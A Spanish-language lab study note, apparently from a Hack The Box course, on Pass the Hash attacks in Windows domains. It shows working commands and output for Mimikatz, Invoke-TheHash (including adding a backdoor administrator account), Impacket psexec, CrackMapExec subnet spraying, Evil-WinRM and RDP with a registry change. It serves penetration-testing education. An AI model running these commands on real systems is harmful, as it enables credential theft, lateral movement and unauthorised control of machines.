
Un ataque de **Pass the Hash (PtH)** es una técnica en la que un atacante utiliza el **hash de una contraseña** en lugar de la contraseña en texto plano para autenticarse.  
El atacante **no necesita descifrar el hash** para obtener la contraseña original.  
Los ataques PtH explotan el protocolo de autenticación, ya que el hash de la contraseña **permanece constante** en cada sesión hasta que se cambie la contraseña.

Como se explicó en secciones anteriores, el atacante debe tener **privilegios administrativos** o privilegios específicos en la máquina objetivo para poder obtener el hash de la contraseña.  
Los **hashes** pueden obtenerse de varias maneras, incluyendo:

- Volcado de la base de datos **SAM** local desde un equipo comprometido.
- Extracción de hashes desde la base de datos **NTDS (ntds.dit)** en un **Controlador de Dominio**.
- Obtención de los hashes directamente desde la **memoria (proceso lsass.exe)**.

Supongamos que obtenemos el siguiente hash de contraseña **(64F12CDDAA88057E06A81B54E73B949B)** para la cuenta **julio** del dominio **inlanefreight.htb**.  
Veamos cómo podemos realizar ataques Pass the Hash desde máquinas **Windows y Linux**.

### Pass the Hash con Mimikatz (Windows)

La primera herramienta que vamos a usar para hacer este tipo de ataque es [Mimikatz](https://github.com/gentilkiwi). Tiene un módulo llamado `sekurlsa::pth` que nos permite hacer un ataque PtH empezando un proceso usando el hash de la contraseña del usuario. Necesitaremos lo siguiente para el módulo en cuestión:
- `/user`: El usuario que queremos impersonar
- `/rc4` o `/NTLM`: EL hash NTLM de la contraseña del usuario
- `/domain`: El dominio al que pertenece el usuario a impersonar
- `/run`: El programa que queremos correr con el contexto del usuario. Por defecto tira de cmd

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Ahora podríamos usar cmd para ejecutar comandos en el contexto del usuario. En el siguiente ejemplo vemos como el usuario `julio` puede conectarse a un directorio compartido llamado `julio` en el DC (controlador de dominio, $Domain Controller$): 

![[Pasted image 20250423175827.png | 800]]

### Pass the Hash con PowerShell Invoke-TheHash (Windows)

Otra herramienta que podemos usar para realizar ataques **Pass the Hash** en Windows es **Invoke-TheHash**. Esta herramienta es una colección de funciones en PowerShell que permiten llevar a cabo ataques **Pass the Hash** utilizando **WMI** y **SMB**. Las conexiones con **WMI** y **SMB** se realizan mediante el **TCPClient** de .NET. La autenticación se realiza pasando un **hash NTLM** al protocolo de autenticación **NTLMv2**. No se requieren privilegios de administrador local en el cliente, pero el usuario y el hash utilizados para la autenticación deben tener derechos administrativos en el equipo objetivo. En este ejemplo, se utilizarán el usuario **julio** y el hash **64F12CDDAA88057E06A81B54E73B949B**.

Cuando se usa **Invoke-TheHash**, existen dos opciones: **ejecución de comandos SMB** o **ejecución de comandos WMI** . Para usar esta herramienta, tendremos que especificar los siguientes parámetros en la máquina objetivo:
- `Target`: Hostname o IP del objetivo
- `Username`: Usuario para la autenticación
- `Domain`: Dominio para la autenticación. Innecesario con cuentas locales o poniendo `@domain` después del usuario
- `Hash`: Hash NTLM para la autenticación
- `Command`: Comando a ejecutar. Si no está especificado, la función comprobará si el usuario tiene acceso a WMI en el objetivo

##### Invoke-TheHash con SMB

```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

También podemos hacer una reverse shell. Consultar [[Shells]]. Otra página muy interesante para hacer reverse shells es [https://www.revshells.com/](https://www.revshells.com/), que nos permite crear tanto el listener como el payload. 

![[Pasted image 20250425092043.png | 800]]

##### Invoke-TheHash con WMI

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JAB..."

[+] Command executed with process id 520 on DC01
```

![[Pasted image 20250425082807.png | 800]]
### Pass the Hash con Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) tiene múltiples herramientas para distintas operaciones como ejecución de comandos y volcado de credenciales, enumeración, etc. Veamos un ejemplo con `PsExec`:

##### Pass the Hash con PsExec (Impacket)

```shell-session
amr251@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Existen muchas otras herramientas de Impacket para este tipo de ataque, como por ejemplo:
- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

##### Pass the Hash con CrackMapExec (Linux)

```shell-session
amr251@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

Si queremos realizar las mismas acciones pero intentar autenticarnos en cada host en una subred usando el hash de la contraseña del administrador local, podríamos añadir `--local-auth`. Este método es de ayuda si obtenemos el hash del administrador local volcando la BBDD SAM en un host y queremos comprobar cuántos (de existir) otros hosts podemos acceder debido al reuso de la contraseña del administrador. Podemos usar `-x` para ejecutar comandos. 

##### CrackMapExec - Ejecución de comandos

```shell-session
amr251@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

##### Pass the Hash con Evil-WinRM (Linux)

```shell-session
amr251@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

##### Pass the Hash con RDP (Linux)

Si usamos `xfreerdp` o `rdesktop`, puede que nos encontremos con el modo de administrador registringido (esto es así por defecto), pero podemos modificarlo añadiendo una nueva clave de registro `DisableRestrictedAdmin` en `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` con valor 0 de esta forma:

```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![[Pasted image 20250425083632.png | 800]]

Una vez la clave de registro ha sido añadida, podemos usar `xfreerdp` con el flag `/pth` y el hash:

```shell-session
amr251@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

### UAC limita el uso de "Pass the Hash" con cuentas locales

El Control de Cuentas de Usuario (UAC, por sus siglas en inglés) restringe la capacidad de los usuarios locales para realizar operaciones de administración remota. Una de las configuraciones clave relacionadas con esto es la clave de registro:

```shell-session
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```

Cuando esta clave tiene el valor `0` (valor predeterminado), **solo la cuenta local de administrador integrada** (con RID-500, usualmente llamada "Administrador") tiene permitido ejecutar tareas de administración remota. Si el valor se establece en `1`, se permite que **otras cuentas locales con privilegios de administrador** también puedan realizar tareas administrativas de forma remota.